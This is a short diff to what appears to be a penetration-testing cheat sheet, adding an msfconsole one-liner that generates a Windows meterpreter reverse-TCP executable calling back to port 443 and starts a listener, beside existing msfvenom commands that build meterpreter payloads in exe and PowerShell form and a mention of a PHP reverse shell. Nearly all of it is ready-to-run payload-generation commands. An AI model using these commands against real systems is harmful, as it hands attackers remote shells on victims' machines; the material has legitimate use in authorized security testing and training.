@@ -43,6 +43,10 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows LHOST=
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$TARGET_IP$ LPORT=4444 -f psh -o meterpreter-64.ps1
 ```
 
+```bash
+msfconsole -q -x "load auto_add_route; use socks_proxy;run -j;use payload/windows/x64/meterpreter/reverse_tcp;set LHOST tun0; set LPORT 443; generate -f exe -o met.exe; to_handler"
+```
+
 Non-staged PHP reverse shell, netcat compatible
 
 #msfvenom #revshell #php-shell
